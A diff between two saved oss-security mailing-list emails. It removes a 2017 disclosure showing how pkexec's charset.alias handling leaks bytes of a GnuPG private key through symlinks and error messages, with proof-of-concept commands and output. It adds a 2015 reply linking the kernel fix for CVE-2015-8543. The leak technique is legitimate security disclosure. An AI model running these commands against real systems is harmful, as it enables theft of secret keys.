@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["4068" "Friday" "23" "June" "2017" "20:23:44" "+0200" "Jakub Wilk" "jwilk@jwilk.net" "<20170623182344.kmgskfvzve457lly@jwilk.net>" "89" "[oss-security] charset.alias in pkexec/glib/gnulib (was: glibc locale issues)" nil nil nil "6" "2017062318:23:44" "[oss-security] charset.alias in pkexec/glib/gnulib (was: glibc locale issues)" (number mark "U       jwilk@jwilk. Jun 23   89/4068  " thread-indent "\"[oss-security] charset.alias in pkexec/glib/gnulib (was: glibc locale issues)\"\n") "<mpro.n8oiuc0ushvds06jd.taviso@cmpxchg8b.com>" ("<mpro.n8oiuc0ushvds06jd.taviso@cmpxchg8b.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1125" "Monday" "14" "December" "2015" "22:34:49" "+0100" "Hannes Frederic Sowa" "hannes@stressinduktion.org" "<566F35F9.4070106@stressinduktion.org>" "36" "Re: [oss-security] Re: CVE request - Android kernel - IPv6 connect cause a denial of service" nil nil nil "12" "2015121421:34:49" "[oss-security] Re: CVE request - Android kernel - IPv6 connect cause a denial of service" (number mark "U       hannes@stres Dec 14   36/1125  " thread-indent "\"Re: [oss-security] Re: CVE request - Android kernel - IPv6 connect cause a denial of service\"\n") "<20151211164118.344948BC165@smtpvmsrv1.mitre.org>" ("<20151211164118.344948BC165@smtpvmsrv1.mitre.org>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 5968 invoked by uid 550); 23 Jun 2017 18:24:17 -0000
+Received: (qmail 13762 invoked by uid 550); 14 Dec 2015 21:35:06 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,110 +12,70 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 5934 invoked from network); 23 Jun 2017 18:24:16 -0000
-Date: Fri, 23 Jun 2017 20:23:44 +0200
-From: Jakub Wilk <jwilk@jwilk.net>
-To: oss-security@lists.openwall.com
-Message-ID: <20170623182344.kmgskfvzve457lly@jwilk.net>
-Mail-Followup-To: oss-security@lists.openwall.com
-References: <mpro.n8oiuc0ushvds06jd.taviso@cmpxchg8b.com>
+Received: (qmail 13661 invoked from network); 14 Dec 2015 21:35:04 -0000
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; d=
+	stressinduktion.org; h=cc:content-transfer-encoding:content-type
+	:date:from:in-reply-to:message-id:mime-version:references
+	:subject:to:x-sasl-enc:x-sasl-enc; s=mesmtp; bh=UmypfWhmjsfVd5CL
+	VwJMr/L6m1A=; b=jGrRQ9isHH+qb8mZ8wZDAK4TTem4xGB1oLXpRcDjOzwh5yMk
+	oYRN/eP/ST2gYGgk9ZIQntl8MmjMot1UHORbqnSkLHx/ACnlnG+HcJ68qsD7zlT7
+	LnRu6dwBDyYq8L9SMObh08cnxmk6YkcmXw4UNSNcdyjKufOGkJPpxFQMn1I=
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; d=
+	messagingengine.com; h=cc:content-transfer-encoding:content-type
+	:date:from:in-reply-to:message-id:mime-version:references
+	:subject:to:x-sasl-enc:x-sasl-enc; s=smtpout; bh=UmypfWhmjsfVd5C
+	LVwJMr/L6m1A=; b=NQWxu99ut/J89Txen8gnZSj+UMgMD9xTzyhJC5fZVjW2PRX
+	8L26YPAYTM2JEiIe1aGFaBDK1piF/Wv57+Fue5eQ/H/5mXGgefrq1pAmoFGt2x7+
+	LqkXTo6jJ9Ptuy8Jmgp31y5KRgbAtWwJYdCYepvj1HYIlHkvpJWcR2246EXY=
+X-Sasl-enc: 0Q3GlApUdtOIvzjBeqtlhtWH2/9xw2D7RQz7d6c1KUsF 1450128891
+To: oss-security@lists.openwall.com, guoyonggang@360.cn
+References: <20151211164118.344948BC165@smtpvmsrv1.mitre.org>
+Cc: cve-assign@mitre.org
+From: Hannes Frederic Sowa <hannes@stressinduktion.org>
+Message-ID: <566F35F9.4070106@stressinduktion.org>
+Date: Mon, 14 Dec 2015 22:34:49 +0100
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101
+ Thunderbird/38.4.0
 MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii; format=flowed
-Content-Disposition: inline
-In-Reply-To: <mpro.n8oiuc0ushvds06jd.taviso@cmpxchg8b.com>
-User-Agent: NeoMutt/20170306 (1.8.0)
-X-Ovh-Tracer-Id: 6684467747960444838
-X-VR-SPAMSTATE: OK
-X-VR-SPAMSCORE: 0
-X-VR-SPAMCAUSE: gggruggvucftvghtrhhoucdtuddrfeeljedrleeggdduvdekucetufdoteggodetrfdotffvucfrrhhofhhilhgvmecuqfggjfdpvefjgfevmfevgfenuceurghilhhouhhtmecufedttdenuc
-Subject: [oss-security] charset.alias in pkexec/glib/gnulib (was: glibc locale issues)
+In-Reply-To: <20151211164118.344948BC165@smtpvmsrv1.mitre.org>
+Content-Type: text/plain; charset=utf-8
+Content-Transfer-Encoding: 7bit
+Subject: Re: [oss-security] Re: CVE request - Android kernel - IPv6 connect
+ cause a denial of service
 
-* Tavis Ormandy <taviso@cmpxchg8b.com>, 2014-07-13, 18:59:
->because pkexec links to glib, the built-in iconv/gconv conversion stuff is 
->used by default. This allows you to setup aliases, which are of the form 
->"charset <arbitrary alias>", for example:
->
->
->$ echo "UTF-7 ThisIsAnAlias" > charset.alias
->$ CHARSET=ThisIsAnAlias CHARSETALIASDIR=$(pwd) pkexec
->pkexec --version +AHw
->       --help +AHw
->       --disable-internal-agent +AHw
->       +AFs---user username+AF0 PROGRAM +AFs-ARGUMENTS...+AF0
->
->(Notice the output is in UTF-7). I guess you can use this to figure out the 
->contents of root owned files (via hard links or symlinks), but it has to be in 
->the right format, and you have to guess the contents. Even then, you will just 
->receive confirmation if you guess right.
+On 11.12.2015 17:41, cve-assign@mitre.org wrote:
+>> net/ipv4/af_inet.c
+>> inet_autobind
+> 
+>> if (sk->sk_prot->get_port(sk, 0)) {
+> 
+>>> if the sk->sk_prot->get_port is NULL
+> 
+>>> [ an unanticipated condition ]
+> 
+>>> Solution:
+>>> if (sk->sk_prot->get_port &&sk->sk_prot->get_port(sk, 0)) {
+> 
+>>>> From: Hannes Frederic Sowa <hannes@stressinduktion.org>
+>>>> Date: Wed, 9 Dec 2015 15:31:32 +0100
+> 
+>>>> I fear your solution
+>>>> just papers over the bug and will leave the port in a half initialized
+>>>> state.
+> 
+> Use CVE-2015-8543 for the originally identified bug. We realize that,
+> for example,
+> http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/log/net/ipv4/af_inet.c
+> has not yet been changed. If Linux kernel developers determine that
+> multiple independent bugs result in situations where
+> sk->sk_prot->get_port is NULL above, then it is possible that
+> additional CVE IDs will be assigned later.
 
-One could abuse this to check if a (otherwise inaccessible) directory exists, 
-or cause DoS by reading from non-regular files (e.g. named pipes, tape 
-devices...). Boring stuff.
+The following patch fixes this issue:
 
-More interestingly, charset.alias items can be also in the "* <charset>" 
-format, and pkexec will tell us if the charset is invalid:
+https://git.kernel.org/cgit/linux/kernel/git/davem/net.git/commit/?id=79462ad02e861803b3840cc782248c7359451cd9
 
-  $ echo '* MOOTF-8' > charset.alias
-  $ CHARSETALIASDIR=. pkexec
-  GLib: Cannot convert message: Conversion from character set 'UTF-8' to 'MOOTF-8' is not supported
-  ...
+It is queued up for -stable.
 
-So how can we exploit this?
-
-* /etc/ppp/pap-secrets can be in the right format: it's whitespace separated 
-and "*" can conceivably appear in the first column. But the second column is 
-hostname, which is normally not very secret.
-
-* Some crontab lines might be in the right format. For example:
-
-  $ echo '43 23 1,15 * * frobnicate --force' > charset.alias
-  $ CHARSETALIASDIR=. pkexec
-  GLib: Cannot convert message: Conversion from character set 'UTF-8' to 'frobnicate' is not supported
-  ...
-
-* If someone was very unlucky when generating a secret key and stored it in an 
-unencrypted binary format, we might be able to steal it. As a feasibility 
-study, I generated 100 thousand of NIST P-256 keys in the format GnuPG 2.1 
-uses. One of them looked like this:
-
-  $ hd 69287.key
-  00000000  28 31 31 3a 70 72 69 76  61 74 65 2d 6b 65 79 28  |(11:private-key(|
-  00000010  33 3a 65 63 63 28 35 3a  63 75 72 76 65 31 30 3a  |3:ecc(5:curve10:|
-  00000020  4e 49 53 54 20 50 2d 32  35 36 29 28 31 3a 71 36  |NIST P-256)(1:q6|
-  00000030  35 3a 04 c2 df 36 0f 55  ef 0a 57 d8 1a 30 2f e1  |5:...6.U..W..0/.|
-  00000040  52 dd 2b 7a 6e dc 58 f3  3a 03 6b 0e d8 c6 8c 77  |R.+zn.X.:.k....w|
-  00000050  2b 71 de 23 d2 04 46 50  0b 61 a2 6e 06 74 c1 76  |+q.#..FP.a.n.t.v|
-  00000060  cc e7 f1 8b 94 3d 1b e9  0c 0f 81 67 72 a2 7c 53  |.....=.....gr.|S|
-  00000070  59 20 cf 29 28 31 3a 64  33 33 3a 00 96 53 90 0c  |Y .)(1:d33:..S..|
-  00000080  2a 0c 92 5d af 80 89 0f  23 4e 98 3e 73 8b 1c ef  |*..]....#N.>s...|
-  00000090  ef cc 8e a7 d9 e9 eb 2f  22 9a e5 51 29 29 29     |......./"..Q)))|
-  0000009f
-
-We're interested in disclosing the number d, which is stored in binary format 
-between "(1:d33:" and ")))".
-
-  $ ln -sf 69287.key charset.alias
-  $ CHARSETALIASDIR=. pkexec 2>&1 | head -n1 | sed -e "s/.*'UTF-8' to '//" | hd
-  00000000  92 5d af 80 89 0f 23 4e  98 3e 73 8b 1c ef ef cc  |.]....#N.>s.....|
-  00000010  8e a7 d9 e9 eb 2f 22 9a  e5 51 29 29 29 27 20 69  |...../"..Q)))' i|
-  00000020  73 20 6e 6f 74 20 73 75  70 70 6f 72 74 65 64 0a  |s not supported.|
-  00000030
-
-So pkexec kindly dumped the last 26 bytes of d for us. We can guess there's 
-asterisk and a whitespace character just before that. The remaining 4 bytes 
-can be brute-forced.
-
-This attack does not (at least, not trivially) extend to reasonably-sized RSA 
-keys, because pkexec dumps at most 50 bytes = 400 bits.
-
->Maybe someone can figure out how to turn this into something scary.
-
-The above is at most mildly scary, but that shouldn't be an excuse for not 
-fixing the bug.
-
-NB, this was partially fixed in gnulib in 2009:
-http://git.savannah.gnu.org/cgit/gnulib.git/commit/?id=b06da86eb05ed57e2861061ae5cacf4c7a3686f1
-But glib has its own copy of this code, which hasn't been updated since 2008.
-
--- 
-Jakub Wilk
+Thanks,
+Hannes
